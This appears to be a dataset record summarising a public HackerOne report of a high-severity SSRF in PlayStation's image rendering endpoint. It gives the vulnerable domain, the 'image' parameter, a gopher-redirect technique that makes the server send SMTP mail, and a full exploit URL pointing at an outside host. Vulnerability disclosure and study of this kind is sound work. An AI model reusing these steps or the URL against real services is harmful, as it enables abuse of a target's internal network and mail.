title: SSRF on Image renderer
target: Playstation
reported_platform: hackerone
bug_type: SSRF
severity: High
report_url: https://hackerone.com/reports/811136
summary: |
  The domain `image.api.np.km.playstation.net` allows image urls to be passed via the `image` parameter. It is possible to use this endpoint to send Gopher 
  requests that result in SMTP messages being sent out. Create a gopher redirect php file to your attacker server. 
  Point the URL to your file location via the image parameter https://image.api.np.km.playstation.net/images/?format=png&image=http%3A%2F%2Fblackdoorsec.net/gopher3.php
  On checking the SMTP log you will see a email from an ec2 instance.
